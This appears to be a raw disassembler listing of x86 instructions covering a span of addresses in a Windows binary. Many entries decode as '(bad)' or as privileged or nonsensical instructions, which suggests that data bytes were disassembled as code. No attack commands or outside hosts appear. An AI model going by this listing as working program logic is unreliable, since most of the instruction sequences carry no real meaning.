  406aab:	0f 11 01             	movups %xmm0,(%ecx)
  406aae:	b9 02 fb 0e 15       	mov    $0x150efb02,%ecx
  406ab3:	01 d1                	add    %edx,%ecx
  406ab5:	02 cd                	add    %ch,%cl
  406ab7:	0d 1b 01 c9 00       	or     $0xc9011b,%eax
  406abc:	28 1c 2b             	sub    %bl,(%ebx,%ebp,1)
  406abf:	01 c9                	add    %ecx,%ecx
  406ac1:	00 5e 08             	add    %bl,0x8(%esi)
  406ac4:	31 01                	xor    %eax,(%ecx)
  406ac6:	c9                   	leave
  406ac7:	00 f6                	add    %dh,%dh
  406ac9:	05 11 01 d9 02       	add    $0x2d90111,%eax
  406ace:	b0 13                	mov    $0x13,%al
  406ad0:	35 01 d9 02 b7       	xor    $0xb702d901,%eax
  406ad5:	1e                   	push   %ds
  406ad6:	38 01                	cmp    %al,(%ecx)
  406ad8:	d9 02                	flds   (%edx)
  406ada:	bc 02 11 01 99       	mov    $0x99011102,%esp
  406adf:	00 c6                	add    %al,%dh
  406ae1:	15 06 00 89 02       	adc    $0x2890006,%eax
  406ae6:	69 1e 4a 01 81 02    	imul   $0x281014a,(%esi),%ebx
  406aec:	7c 17                	jl     0x406b05
  406aee:	4e                   	dec    %esi
  406aef:	01 a9 01 c6 15 10    	add    %ebp,0x1015c601(%ecx)
  406af5:	00 a9 01 f8 1a 06    	add    %ch,0x61af801(%ecx)
  406afb:	00 e1                	add    %ah,%cl
  406afd:	02 c6                	add    %dh,%al
  406aff:	15 10 00 b1 01       	adc    $0x1b10010,%eax
  406b04:	c6                   	(bad)
  406b05:	15 5c 01 b1 01       	adc    $0x1b1015c,%eax
  406b0a:	ba 07 69 01 09       	mov    $0x9016907,%edx
  406b0f:	01 5a 11             	add    %ebx,0x11(%edx)
  406b12:	6e                   	outsb  %ds:(%esi),(%dx)
  406b13:	01 d9                	add    %ebx,%ecx
  406b15:	00 7f 1c             	add    %bh,0x1c(%edi)
  406b18:	74 01                	je     0x406b1b
  406b1a:	d9 00                	flds   (%eax)
  406b1c:	27                   	daa
  406b1d:	0f 74 01             	pcmpeqb (%ecx),%mm0
  406b20:	e1 02                	loope  0x406b24
  406b22:	65 0f c7             	gs (bad)
  406b25:	00 e1                	add    %ah,%cl
  406b27:	00 c6                	add    %al,%dh
  406b29:	15 06 00 e1 00       	adc    $0xe10006,%eax
  406b2e:	ad                   	lods   %ds:(%esi),%eax
  406b2f:	17                   	pop    %ss
  406b30:	7e 01                	jle    0x406b33
  406b32:	f1                   	int1
  406b33:	02 49 06             	add    0x6(%ecx),%cl
  406b36:	10 00                	adc    %al,(%eax)
  406b38:	e1 00                	loope  0x406b3a
  406b3a:	28 1c 06             	sub    %bl,(%esi,%eax,1)
  406b3d:	00 e1                	add    %ah,%cl
  406b3f:	00 45 1d             	add    %al,0x1d(%ebp)
  406b42:	8d 01                	lea    (%ecx),%eax
  406b44:	f9                   	stc
  406b45:	02 4a 1c             	add    0x1c(%edx),%cl
  406b48:	93                   	xchg   %eax,%ebx
  406b49:	01 f9                	add    %edi,%ecx
  406b4b:	02 53 0b             	add    0xb(%ebx),%dl
  406b4e:	98                   	cwtl
  406b4f:	01 e9                	add    %ebp,%ecx
  406b51:	00 eb                	add    %ch,%bl
  406b53:	0e                   	push   %cs
  406b54:	9e                   	sahf
  406b55:	01 09                	add    %ecx,(%ecx)
  406b57:	03 51 11             	add    0x11(%ecx),%edx
  406b5a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406b5b:	01 b9 02 e3 1e 68    	add    %edi,0x681ee302(%ecx)
  406b61:	00 11                	add    %dl,(%ecx)
  406b63:	03 c7                	add    %edi,%eax
  406b65:	03 a9 01 11 03 89    	add    -0x76fceeff(%ecx),%ebp
  406b6b:	17                   	pop    %ss
  406b6c:	af                   	scas   %es:(%edi),%eax
  406b6d:	01 01                	add    %eax,(%ecx)
  406b6f:	03 14 0b             	add    (%ebx,%ecx,1),%edx
  406b72:	10 00                	adc    %al,(%eax)
  406b74:	01 03                	add    %eax,(%ebx)
  406b76:	38 11                	cmp    %dl,(%ecx)
  406b78:	b5 01                	mov    $0x1,%ch
  406b7a:	19 03                	sbb    %eax,(%ebx)
  406b7c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b7d:	0b bb 01 19 03 75    	or     0x75031901(%ebx),%edi
  406b83:	0b 06                	or     (%esi),%eax
  406b85:	00 c9                	add    %cl,%cl
  406b87:	00 c6                	add    %al,%dh
  406b89:	15 06 00 c9 00       	adc    $0xc90006,%eax
  406b8e:	83 13 ca             	adcl   $0xffffffca,(%ebx)
  406b91:	01 b9 02 ae 1a 9c    	add    %edi,-0x63e551fe(%ecx)
  406b97:	00 49 02             	add    %cl,0x2(%ecx)
  406b9a:	f4                   	hlt
  406b9b:	1c 15                	sbb    $0x15,%al
  406b9d:	00 c9                	add    %cl,%cl
  406b9f:	00 28                	add    %ch,(%eax)
  406ba1:	1c 31                	sbb    $0x31,%al
  406ba3:	01 c9                	add    %ecx,%ecx
  406ba5:	00 e1                	add    %ah,%cl
  406ba7:	1c d0                	sbb    $0xd0,%al
  406ba9:	01 21                	add    %esp,(%ecx)
  406bab:	03 1f                	add    (%edi),%ebx
  406bad:	07                   	pop    %es
  406bae:	c7 00 c9 00 96 1b    	movl   $0x1b9600c9,(%eax)
  406bb4:	06                   	push   %es
  406bb5:	00 d1                	add    %dl,%cl
  406bb7:	00 14 08             	add    %dl,(%eax,%ecx,1)
  406bba:	c7 00 a1 00 e9 0d    	movl   $0xde900a1,(%eax)
  406bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc1:	01 29                	add    %ebp,(%ecx)
  406bc3:	03 7b 0b             	add    0xb(%ebx),%edi
  406bc6:	06                   	push   %es
  406bc7:	00 49 02             	add    %cl,0x2(%ecx)
  406bca:	ff 08                	decl   (%eax)
  406bcc:	dd 01                	fldl   (%ecx)
  406bce:	a1 00 03 08 10       	mov    0x10080300,%eax
  406bd3:	00 39                	add    %bh,(%ecx)
  406bd5:	03 76 06             	add    0x6(%esi),%esi
  406bd8:	e4 01                	in     $0x1,%al
  406bda:	39 03                	cmp    %eax,(%ebx)
  406bdc:	7b 0e                	jnp    0x406bec
  406bde:	e4 01                	in     $0x1,%al
  406be0:	c9                   	leave
  406be1:	00 3f                	add    %bh,(%edi)
  406be3:	17                   	pop    %ss
  406be4:	f4                   	hlt
  406be5:	01 c9                	add    %ecx,%ecx
  406be7:	00 9b 09 c7 00 b9    	add    %bl,-0x46ff38f7(%ebx)
  406bed:	02 13                	add    (%ebx),%dl
  406bef:	15 c7 00 0c 00       	adc    $0xc00c7,%eax
  406bf4:	c6                   	(bad)
  406bf5:	15 d2 00 49 03       	adc    $0x34900d2,%eax
  406bfa:	34 1e                	xor    $0x1e,%al
  406bfc:	02 02                	add    (%edx),%al
  406bfe:	f1                   	int1
  406bff:	00 c6                	add    %al,%dh
  406c01:	15 10 00 f1 00       	adc    $0xf10010,%eax
  406c06:	35 1b 34 02 f9       	xor    $0xf902341b,%eax
  406c0b:	00 a8 15 39 02 01    	add    %ch,0x1023915(%eax)
  406c11:	01 f8                	add    %edi,%eax
  406c13:	1b 3f                	sbb    (%edi),%edi
  406c15:	02 09                	add    (%ecx),%cl
  406c17:	01 51 11             	add    %edx,0x11(%ecx)
  406c1a:	45                   	inc    %ebp
  406c1b:	02 99 00 e2 0e c7    	add    -0x38f11e00(%ecx),%bl
  406c21:	00 01                	add    %al,(%ecx)
  406c23:	01 0f                	add    %ecx,(%edi)
  406c25:	1d 31 01 a1 00       	sbb    $0xa10131,%eax
  406c2a:	f7 1d 32 00 a1 00    	negl   0xa10032
  406c30:	e0 0d                	loopne 0x406c3f
  406c32:	45                   	inc    %ebp
  406c33:	02 59 03             	add    0x3(%ecx),%bl
  406c36:	50                   	push   %eax
  406c37:	1d 51 02 59 03       	sbb    $0x3590251,%eax
  406c3c:	c8 13 06 00          	enter  $0x613,$0x0
  406c40:	59                   	pop    %ecx
  406c41:	03 12                	add    (%edx),%edx
  406c43:	16                   	push   %ss
  406c44:	57                   	push   %edi
  406c45:	02 11                	add    (%ecx),%dl
  406c47:	01 2a                	add    %ebp,(%edx)
  406c49:	16                   	push   %ss
  406c4a:	69 02 11 01 42 1a    	imul   $0x1a420111,(%edx),%eax
  406c50:	70 02                	jo     0x406c54
  406c52:	49                   	dec    %ecx
  406c53:	03 28                	add    (%eax),%ebp
  406c55:	08 76 02             	or     %dh,0x2(%esi)
  406c58:	14 00                	adc    $0x0,%al
  406c5a:	c6                   	(bad)
  406c5b:	15 d2 00 49 03       	adc    $0x34900d2,%eax
  406c60:	f1                   	int1
  406c61:	1a 89 02 b9 02 fc    	sbb    -0x3fd46fe(%ecx),%cl
  406c67:	11 a9 02 b9 02 47    	adc    %ebp,0x4702b902(%ecx)
  406c6d:	18 bf 02 d1 02 50    	sbb    %bh,0x5002d102(%edi)
  406c73:	03 cf                	add    %edi,%ecx
  406c75:	02 99 02 d9 09 eb    	add    -0x14f626fe(%ecx),%bl
  406c7b:	02 b9 02 ae 1a f0    	add    -0xfe551fe(%ecx),%bh
  406c81:	02 99 02 92 0f 4a    	add    0x4a0f9202(%ecx),%bl
  406c87:	01 19                	add    %ebx,(%ecx)
  406c89:	01 0f                	add    %ecx,(%edi)
  406c8b:	07                   	pop    %es
  406c8c:	f6 02 19             	testb  $0x19,(%edx)
  406c8f:	01 e2                	add    %esp,%edx
  406c91:	0e                   	push   %cs
  406c92:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406c93:	01 81 02 24 1d fc    	add    %eax,-0x3e2dbfe(%ecx)
  406c99:	02 d9                	add    %cl,%bl
  406c9b:	01 83 0b 08 03 d9    	add    %eax,-0x26fcf7f5(%ebx)
  406ca1:	01 28                	add    %ebp,(%eax)
  406ca3:	1c 0e                	sbb    $0xe,%al
  406ca5:	03 d9                	add    %ecx,%ebx
  406ca7:	01 0d 10 1c 03 41    	add    %ecx,0x41031c10
  406cad:	01 c6                	add    %eax,%esi
  406caf:	15 2b 03 41 01       	adc    $0x141032b,%eax
  406cb4:	c6                   	(bad)
  406cb5:	1c 01                	sbb    $0x1,%al
  406cb7:	00 41 01             	add    %al,0x1(%ecx)
  406cba:	b6 1c                	mov    $0x1c,%dh
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	41                   	inc    %ecx
  406cbf:	01 f8                	add    %edi,%eax
  406cc1:	1a 38                	sbb    (%eax),%bh
  406cc3:	03 41 01             	add    0x1(%ecx),%eax
  406cc6:	40                   	inc    %eax
  406cc7:	07                   	pop    %es
  406cc8:	3e 03 41 01          	add    %ds:0x1(%ecx),%eax
  406ccc:	f2 0d 3e 03 41 01    	repnz or $0x141033e,%eax
  406cd2:	75 0b                	jne    0x406cdf
  406cd4:	06                   	push   %es
  406cd5:	00 79 01             	add    %bh,0x1(%ecx)
  406cd8:	34 1e                	xor    $0x1e,%al
  406cda:	58                   	pop    %eax
  406cdb:	03 51 01             	add    0x1(%ecx),%edx
  406cde:	c6                   	(bad)
  406cdf:	15 5d 03 51 01       	adc    $0x151035d,%eax
  406ce4:	28 1c 06             	sub    %bl,(%esi,%eax,1)
  406ce7:	00 51 01             	add    %dl,0x1(%ecx)
  406cea:	6a 0e                	push   $0xe
  406cec:	31 01                	xor    %eax,(%ecx)
  406cee:	51                   	push   %ecx
  406cef:	01 ca                	add    %ecx,%edx
  406cf1:	1b 65 03             	sbb    0x3(%ebp),%esp
  406cf4:	59                   	pop    %ecx
  406cf5:	01 2e                	add    %ebp,(%esi)
  406cf7:	11 6b 03             	adc    %ebp,0x3(%ebx)
  406cfa:	69 01 c6 15 71 03    	imul   $0x37115c6,(%ecx),%eax
  406d00:	71 01                	jno    0x406d03
  406d02:	c6                   	(bad)
  406d03:	15 71 03 71 01       	adc    $0x1710371,%eax
  406d08:	19 0f                	sbb    %ecx,(%edi)
  406d0a:	15 00 21 03 66       	adc    $0x66032100,%eax
  406d0f:	0a c7                	or     %bh,%al
  406d11:	00 b9 02 a7 07 68    	add    %bh,0x6807a702(%ecx)
  406d17:	00 89 03 6f 0a 10    	add    %cl,0x100a6f03(%ecx)
  406d1d:	00 49 01             	add    %cl,0x1(%ecx)
  406d20:	ca 06 31             	lret   $0x3106
  406d23:	01 51 01             	add    %edx,0x1(%ecx)
  406d26:	c8 13 06 00          	enter  $0x613,$0x0
  406d2a:	49                   	dec    %ecx
  406d2b:	02 c6                	add    %dh,%al
  406d2d:	15 85 03 49 02       	adc    $0x2490385,%eax
  406d32:	64 15 15 00 c9 00    	fs adc $0xc90015,%eax
  406d38:	52                   	push   %edx
  406d39:	15 d0 01 91 03       	adc    $0x39101d0,%eax
  406d3e:	bd 09 4a 01 91       	mov    $0x91014a09,%ebp
  406d43:	03 9b 1e 99 03 99    	add    -0x66fc66e2(%ebx),%ebx
  406d49:	03 6a 1c             	add    0x1c(%edx),%ebp
  406d4c:	a0 03 79 01 0e       	mov    0xe017903,%al
  406d51:	1e                   	push   %ds
  406d52:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406d53:	03 b9 02 90 1b ad    	add    -0x52e46ffe(%ecx),%edi
  406d59:	03 81 01 c6 15 06    	add    0x615c601(%ecx),%eax
  406d5f:	00 81 01 40 07 be    	add    %al,-0x41f8bfff(%ecx)
  406d65:	03 89 01 a3 1a c6    	add    -0x39e55cff(%ecx),%ecx
  406d6b:	03 59 01             	add    0x1(%ecx),%ebx
  406d6e:	c6                   	(bad)
  406d6f:	15 06 00 59 01       	adc    $0x1590006,%eax
  406d74:	9b                   	fwait
  406d75:	05 d3 03 39 01       	add    $0x13903d3,%eax
  406d7a:	7f 1b                	jg     0x406d97
  406d7c:	db 03                	fildl  (%ebx)
  406d7e:	59                   	pop    %ecx
  406d7f:	01 85 06 31 01 81    	add    %eax,-0x7efecefa(%ebp)
  406d85:	02 22                	add    (%edx),%ah
  406d87:	0a e9                	or     %cl,%ch
  406d89:	03 b1 00 53 12 ef    	add    -0x10edad00(%ecx),%esi
  406d8f:	03 91 01 62 19 f9    	add    -0x6e69dff(%ecx),%edx
  406d95:	03 21                	add    (%ecx),%esp
  406d97:	01 b0 10 06 00 21    	add    %esi,0x21000610(%eax)
  406d9d:	01 c6                	add    %eax,%esi
  406d9f:	15 06 00 a9 00       	adc    $0xa90006,%eax
  406da4:	13 1d 10 04 b9 02    	adc    0x2b90410,%ebx
  406daa:	d4 18                	aam    $0x18
  406dac:	15 04 b9 02 c6       	adc    $0xc602b904,%eax
  406db1:	15 1a 04 81 02       	adc    $0x281041a,%eax
  406db6:	38 1e                	cmp    %bl,(%esi)
  406db8:	fc                   	cld
  406db9:	02 81 02 6e 17 23    	add    0x23176e02(%ecx),%al
  406dbf:	04 a1                	add    $0xa1,%al
  406dc1:	02 06                	add    (%esi),%al
  406dc3:	17                   	pop    %ss
  406dc4:	40                   	inc    %eax
  406dc5:	04 b9                	add    $0xb9,%al
  406dc7:	02 26                	add    (%esi),%ah
  406dc9:	18 47 04             	sbb    %al,0x4(%edi)
  406dcc:	c1 03 04             	roll   $0x4,(%ebx)
  406dcf:	1c 4f                	sbb    $0x4f,%al
  406dd1:	04 c9                	add    $0xc9,%al
  406dd3:	03 c6                	add    %esi,%eax
  406dd5:	15 55 04 c9 03       	adc    $0x3c90455,%eax
  406dda:	b6 08                	mov    $0x8,%dh
  406ddc:	5c                   	pop    %esp
  406ddd:	04 39                	add    $0x39,%al
  406ddf:	01 ea                	add    %ebp,%edx
  406de1:	14 75                	adc    $0x75,%al
  406de3:	04 d1                	add    $0xd1,%al
  406de5:	01 a2 1b 06 00 f9    	add    %esp,-0x6fff9e5(%edx)
  406deb:	01 c6                	add    %eax,%esi
  406ded:	15 10 00 f9 01       	adc    $0x1f90010,%eax
  406df2:	e2 0f                	loop   0x406e03
  406df4:	57                   	push   %edi
  406df5:	02 89 02 9d 1b ef    	add    -0x10e462fe(%ecx),%cl
  406dfb:	00 81 02 38 1e 86    	add    %al,-0x79e1c7fe(%ecx)
  406e01:	04 99                	add    $0x99,%al
  406e03:	02 86 0f eb 02 b9    	add    -0x46fd14f1(%esi),%al
  406e09:	02 17                	add    (%edi),%dl
  406e0b:	07                   	pop    %es
  406e0c:	8d 04 b9             	lea    (%ecx,%edi,4),%eax
  406e0f:	02 26                	add    (%esi),%ah
  406e11:	18 93 04 1c 00 c6    	sbb    %dl,-0x39ffe3fc(%ebx)
  406e17:	15 d2 00 21 01       	adc    $0x12100d2,%eax
  406e1c:	a2 11 a5 04 39       	mov    %al,0x3904a511
  406e21:	01 47 13             	add    %eax,0x13(%edi)
  406e24:	ab                   	stos   %eax,%es:(%edi)
  406e25:	04 d9                	add    $0xd9,%al
  406e27:	03 26                	add    (%esi),%esp
  406e29:	15 c8 04 d9 03       	adc    $0x3d904c8,%eax
  406e2e:	6f                   	outsl  %ds:(%esi),(%dx)
  406e2f:	0a b7 00 d9 03 47    	or     0x4703d900(%edi),%dh
  406e35:	15 cf 04 e9 03       	adc    $0x3e904cf,%eax
  406e3a:	0d 15 e8 04 e9       	or     $0xe904e815,%eax
  406e3f:	03 9d 1b ef 04 29    	add    0x2904ef1b(%ebp),%ebx
  406e45:	02 a3 17 03 05 29    	add    0x29050317(%ebx),%ah
  406e4b:	02 de                	add    %dh,%bl
  406e4d:	1d 31 01 29 02       	sbb    $0x2290131,%eax
  406e52:	dd 0a                	fisttpll (%edx)
  406e54:	0a 05 29 02 7d 1e    	or     0x1e7d0229,%al
  406e5a:	10 05 01 04 8e 09    	adc    %al,0x98e0401
  406e60:	c7 00 b9 02 f4 0f    	movl   $0xff402b9,(%eax)
  406e66:	47                   	inc    %edi
  406e67:	04 a1                	add    $0xa1,%al
  406e69:	01 c6                	add    %eax,%esi
  406e6b:	15 06 00 a1 01       	adc    $0x1a10006,%eax
  406e70:	ea 09 10 00 a1 01 81 	ljmp   $0x8101,$0xa1001009
  406e77:	07                   	pop    %es
  406e78:	10 00                	adc    %al,(%eax)
  406e7a:	a1 01 32 12 2d       	mov    0x2d123201,%eax
  406e7f:	05 a1 01 e2 16       	add    $0x16e201a1,%eax
  406e84:	15 00 a1 01 01       	adc    $0x101a100,%eax
  406e89:	12 34 05 91 01 f6 15 	adc    0x15f60191(,%eax,1),%dh
  406e90:	3b 05 19 04 aa 1c    	cmp    0x1caa0419,%eax
  406e96:	42                   	inc    %edx
  406e97:	05 a9 01 c6 15       	add    $0x15c601a9,%eax
  406e9c:	49                   	dec    %ecx
  406e9d:	05 a9 01 93 06       	add    $0x69301a9,%eax
  406ea2:	31 01                	xor    %eax,(%ecx)
  406ea4:	d9 00                	flds   (%eax)
  406ea6:	3c 19                	cmp    $0x19,%al
  406ea8:	51                   	push   %ecx
  406ea9:	05 d9 00 6c 07       	add    $0x76c00d9,%eax
  406eae:	58                   	pop    %eax
  406eaf:	05 99 01 c6 15       	add    $0x15c60199,%eax
  406eb4:	d2 00                	rolb   %cl,(%eax)
  406eb6:	39 01                	cmp    %eax,(%ecx)
  406eb8:	47                   	inc    %edi
  406eb9:	13 7b 05             	adc    0x5(%ebx),%edi
  406ebc:	d1 01                	roll   $1,(%ecx)
  406ebe:	ba 06 31 01 d9       	mov    $0xd9013106,%edx
  406ec3:	01 a3 06 84 05 b9    	add    %esp,-0x46fa7bfa(%ebx)
  406ec9:	01 c6                	add    %eax,%esi
  406ecb:	15 01 00 24 00       	adc    $0x240001,%eax
  406ed0:	c6                   	(bad)
  406ed1:	15 06 00 b9 02       	adc    $0x2b90006,%eax
  406ed6:	b5 1a                	mov    $0x1a,%ch
  406ed8:	a1 05 b9 01 a8       	mov    0xa801b905,%eax
  406edd:	05 1c 03 39 01       	add    $0x139031c,%eax
  406ee2:	47                   	inc    %edi
  406ee3:	13 a8 05 24 00 49    	adc    0x49002405(%eax),%ebp
  406ee9:	06                   	push   %es
  406eea:	b6 05                	mov    $0x5,%dh
  406eec:	39 01                	cmp    %eax,(%ecx)
  406eee:	e4 10                	in     $0x10,%al
  406ef0:	bc 05 d9 01 0b       	mov    $0xb01d905,%esp
  406ef5:	13 ca                	adc    %edx,%ecx
  406ef7:	05 d9 01 ac 1b       	add    $0x1bac01d9,%eax
  406efc:	06                   	push   %es
  406efd:	00 d9                	add    %bl,%cl
  406eff:	01 94 0a 27 00 39 01 	add    %edx,0x1390027(%edx,%ecx,1)
  406f06:	b3 1d                	mov    $0x1d,%bl
  406f08:	eb 05                	jmp    0x406f0f
  406f0a:	39 01                	cmp    %eax,(%ecx)
  406f0c:	30 1e                	xor    %bl,(%esi)
  406f0e:	0f 06                	clts
  406f10:	2c 00                	sub    $0x0,%al
  406f12:	ea 14 27 06 34 00 ba 	ljmp   $0xba00,$0x34062714
  406f19:	06                   	push   %es
  406f1a:	31 01                	xor    %eax,(%ecx)
  406f1c:	34 00                	xor    $0x0,%al
  406f1e:	a2 1b 48 06 59       	mov    %al,0x5906481b
  406f23:	01 75 0b             	add    %esi,0xb(%ebp)
  406f26:	06                   	push   %es
  406f27:	00 59 01             	add    %bl,0x1(%ecx)
  406f2a:	7b 0b                	jnp    0x406f37
  406f2c:	06                   	push   %es
  406f2d:	00 81 02 32 0a 80    	add    %al,-0x7ff5cdfe(%ecx)
  406f33:	06                   	push   %es
  406f34:	81 02 00 0a e9 03    	addl   $0x3e90a00,(%edx)
  406f3a:	81 02 11 0a 80 06    	addl   $0x6800a11,(%edx)
  406f40:	81 02 42 0a e9 03    	addl   $0x3e90a42,(%edx)
  406f46:	81 02 54 0a 80 06    	addl   $0x6800a54,(%edx)
  406f4c:	b9 01 4b 0b 11       	mov    $0x110b4b01,%ecx
  406f51:	01 31                	add    %esi,(%ecx)
  406f53:	04 43                	add    $0x43,%al
  406f55:	0b 90 06 31 04 7f    	or     0x7f043106(%eax),%edx
  406f5b:	1d 06 00 39 01       	sbb    $0x1390006,%eax
  406f60:	b3 1d                	mov    $0x1d,%bl
  406f62:	a9 06 b1 00 61       	test   $0x6100b106,%eax
  406f67:	1d f4 00 39 01       	sbb    $0x13900f4,%eax
  406f6c:	e4 10                	in     $0x10,%al
  406f6e:	bc 06 21 01 ca       	mov    $0xca012106,%esp
  406f73:	06                   	push   %es
  406f74:	31 01                	xor    %eax,(%ecx)
  406f76:	09 00                	or     %eax,(%eax)
  406f78:	0c 00                	or     $0x0,%al
  406f7a:	ed                   	in     (%dx),%eax
  406f7b:	06                   	push   %es
  406f7c:	09 00                	or     %eax,(%eax)
  406f7e:	10 00                	adc    %al,(%eax)
  406f80:	f2 06                	repnz push %es
  406f82:	09 00                	or     %eax,(%eax)
  406f84:	14 00                	adc    $0x0,%al
  406f86:	f7 06 09 00 18 00    	testl  $0x180009,(%esi)
  406f8c:	fc                   	cld
  406f8d:	06                   	push   %es
  406f8e:	09 00                	or     %eax,(%eax)
  406f90:	1c 00                	sbb    $0x0,%al
  406f92:	01 07                	add    %eax,(%edi)
  406f94:	08 00                	or     %al,(%eax)
  406f96:	44                   	inc    %esp
  406f97:	00 06                	add    %al,(%esi)
  406f99:	07                   	pop    %es
  406f9a:	08 00                	or     %al,(%eax)
  406f9c:	48                   	dec    %eax
  406f9d:	00 0b                	add    %cl,(%ebx)
  406f9f:	07                   	pop    %es
  406fa0:	27                   	daa
  406fa1:	00 83 00 4e 0a 2e    	add    %al,0x2e0a4e00(%ebx)
  406fa7:	00 0b                	add    %cl,(%ebx)
  406fa9:	00 c3                	add    %al,%bl
  406fab:	08 2e                	or     %ch,(%esi)
  406fad:	00 13                	add    %dl,(%ebx)
  406faf:	00 cc                	add    %cl,%ah
  406fb1:	08 2e                	or     %ch,(%esi)
  406fb3:	00 1b                	add    %bl,(%ebx)
  406fb5:	00 eb                	add    %ch,%bl
  406fb7:	08 2e                	or     %ch,(%esi)
  406fb9:	00 23                	add    %ah,(%ebx)
  406fbb:	00 f4                	add    %dh,%ah
  406fbd:	08 2e                	or     %ch,(%esi)
  406fbf:	00 2b                	add    %ch,(%ebx)
  406fc1:	00 f4                	add    %dh,%ah
  406fc3:	08 2e                	or     %ch,(%esi)
  406fc5:	00 33                	add    %dh,(%ebx)
  406fc7:	00 06                	add    %al,(%esi)
  406fc9:	09 2e                	or     %ebp,(%esi)
  406fcb:	00 3b                	add    %bh,(%ebx)
  406fcd:	00 0c 09             	add    %cl,(%ecx,%ecx,1)
  406fd0:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  406fd4:	f4                   	hlt
  406fd5:	08 2e                	or     %ch,(%esi)
  406fd7:	00 4b 00             	add    %cl,0x0(%ebx)
  406fda:	18 09                	sbb    %cl,(%ecx)
  406fdc:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  406fe0:	06                   	push   %es
  406fe1:	09 2e                	or     %ebp,(%esi)
  406fe3:	00 5b 00             	add    %bl,0x0(%ebx)
  406fe6:	06                   	push   %es
  406fe7:	09 2e                	or     %ebp,(%esi)
  406fe9:	00 63 00             	add    %ah,0x0(%ebx)
  406fec:	39 09                	cmp    %ecx,(%ecx)
  406fee:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  406ff2:	63 09                	arpl   %ecx,(%ecx)
  406ff4:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406ff8:	70 09                	jo     0x407003
  406ffa:	03 03                	add    (%ebx),%eax
  406ffc:	8b 00                	mov    (%eax),%eax
  406ffe:	4e                   	dec    %esi
  406fff:	0a 23                	or     (%ebx),%ah
  407001:	03 8b 00 4e 0a 43    	add    0x430a4e00(%ebx),%ecx
  407007:	03 8b 00 4e 0a 63    	add    0x630a4e00(%ebx),%ecx
  40700d:	03 8b 00 4e 0a 83    	add    -0x7cf5b200(%ebx),%ecx
  407013:	03 8b 00 4e 0a a3    	add    -0x5cf5b200(%ebx),%ecx
  407019:	03 8b 00 4e 0a c3    	add    -0x3cf5b200(%ebx),%ecx
  40701f:	03 8b 00 4e 0a e3    	add    -0x1cf5b200(%ebx),%ecx
  407025:	03 8b 00 4e 0a 03    	add    0x30a4e00(%ebx),%ecx
  40702b:	04 8b                	add    $0x8b,%al
  40702d:	00 4e 0a             	add    %cl,0xa(%esi)
  407030:	23 04 8b             	and    (%ebx,%ecx,4),%eax
  407033:	00 4e 0a             	add    %cl,0xa(%esi)
  407036:	43                   	inc    %ebx
  407037:	04 8b                	add    $0x8b,%al
  407039:	00 4e 0a             	add    %cl,0xa(%esi)
  40703c:	63 04 8b             	arpl   %eax,(%ebx,%ecx,4)
  40703f:	00 4e 0a             	add    %cl,0xa(%esi)
  407042:	83 04 8b 00          	addl   $0x0,(%ebx,%ecx,4)
  407046:	4e                   	dec    %esi
  407047:	0a a3 04 8b 00 4e    	or     0x4e008b04(%ebx),%ah
  40704d:	0a c3                	or     %bl,%al
  40704f:	04 8b                	add    $0x8b,%al
  407051:	00 4e 0a             	add    %cl,0xa(%esi)
  407054:	e3 04                	jecxz  0x40705a
  407056:	8b 00                	mov    (%eax),%eax
  407058:	4e                   	dec    %esi
  407059:	0a 03                	or     (%ebx),%al
  40705b:	05 8b 00 4e 0a       	add    $0xa4e008b,%eax
  407060:	23 05 8b 00 4e 0a    	and    0xa4e008b,%eax
  407066:	43                   	inc    %ebx
  407067:	05 8b 00 4e 0a       	add    $0xa4e008b,%eax
  40706c:	e0 06                	loopne 0x407074
  40706e:	93                   	xchg   %eax,%ebx
  40706f:	00 be 09 e0 07 93    	add    %bh,-0x6cf81ff7(%esi)
  407075:	00 ea                	add    %ch,%dl
  407077:	09 40 09             	or     %eax,0x9(%eax)
  40707a:	93                   	xchg   %eax,%ebx
  40707b:	00 2b                	add    %ch,(%ebx)
  40707d:	0a 40 09             	or     0x9(%eax),%al
  407080:	b3 00                	mov    $0x0,%bl
  407082:	4e                   	dec    %esi
  407083:	0a 40 0a             	or     0xa(%eax),%al
  407086:	93                   	xchg   %eax,%ebx
  407087:	00 53 0a             	add    %dl,0xa(%ebx)
  40708a:	e0 0a                	loopne 0x407096
  40708c:	93                   	xchg   %eax,%ebx
  40708d:	00 88 0a 00 0e 93    	add    %cl,-0x6cf1fff6(%eax)
  407093:	00 b8 0a 40 0e ab    	add    %bh,-0x54f1bff6(%eax)
  407099:	00 4e 0a             	add    %cl,0xa(%esi)
  40709c:	80 0e ab             	orb    $0xab,(%esi)
  40709f:	00 4e 0a             	add    %cl,0xa(%esi)
  4070a2:	20 0f                	and    %cl,(%edi)
  4070a4:	ab                   	stos   %eax,%es:(%edi)
  4070a5:	00 4e 0a             	add    %cl,0xa(%esi)
  4070a8:	80 0f 93             	orb    $0x93,(%edi)
  4070ab:	00 fc                	add    %bh,%ah
  4070ad:	0a c0                	or     %al,%al
  4070af:	0f ab 00             	bts    %eax,(%eax)
  4070b2:	4e                   	dec    %esi
  4070b3:	0a 20                	or     (%eax),%ah
  4070b5:	10 93 00 28 0b a0    	adc    %dl,-0x5ff4d800(%ebx)
  4070bb:	10 ab 00 4e 0a e0    	adc    %ch,-0x1ff5b200(%ebx)
  4070c1:	10 ab 00 4e 0a 20    	adc    %ch,0x200a4e00(%ebx)
  4070c7:	11 ab 00 4e 0a 60    	adc    %ebp,0x600a4e00(%ebx)
  4070cd:	11 ab 00 4e 0a 08    	adc    %ebp,0x80a4e00(%ebx)
  4070d3:	00 06                	add    %al,(%esi)
  4070d5:	00 10                	add    %dl,(%eax)
  4070d7:	07                   	pop    %es
  4070d8:	01 00                	add    %eax,(%eax)
  4070da:	03 00                	add    (%eax),%eax
  4070dc:	00 00                	add    %al,(%eax)
  4070de:	2b 00                	sub    (%eax),%eax
  4070e0:	01 00                	add    %eax,(%eax)
  4070e2:	7a 00                	jp     0x4070e4
  4070e4:	00 00                	add    %al,(%eax)
  4070e6:	2c 00                	sub    $0x0,%al
